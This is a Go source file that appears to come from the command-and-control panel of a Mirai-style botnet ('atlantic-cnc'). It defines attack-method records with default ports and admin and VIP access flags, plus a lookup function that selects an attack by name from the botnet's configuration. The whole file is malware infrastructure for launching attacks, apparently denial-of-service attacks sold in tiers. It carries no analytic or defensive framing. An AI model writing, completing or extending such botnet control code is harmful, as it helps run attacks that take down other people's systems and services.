package attack_launch

import (
        "strings"
        "atlantic-cnc/core/models/json/meta"
)

var MethodTypeCon string

type Mirai struct {
        ID uint16

        Name        string
        Description string

        DefaultPort string

        Admin bool
        Vip  bool
}

type MiraiAddr struct {
        Name      string
        Description string
        Args        []string
}

var SlaveSyncXD *meta.Slaves

// gets the method name from attack.json and returns it in a struct
func Fetch(Name string) (*Method, *Mirai) {
        for l := 0; l < len(SlaveSyncXD.Slaves); l++ {
                if strings.ToLower(SlaveSyncXD.Slaves[l].Name) == strings.Replace(Name, SlaveSyncXD.AttackPrefix, "", -1) {
                        MethodTypeCon = "mirai"

                        var Attack = Mirai {
                                ID: SlaveSyncXD.Slaves[l].ID,
                                Name: SlaveSyncXD.Slaves[l].Name,

                                Description: SlaveSyncXD.Slaves[l].Description,

                                DefaultPort: SlaveSyncXD.Slaves[l].DefaultPort,

                                Admin: SlaveSyncXD.Slaves[l].Admin,
                                Vip: SlaveSyncXD.Slaves[l].Vip,
                        }

                        return nil, &Attack
                }
        }


        return nil, nil
}
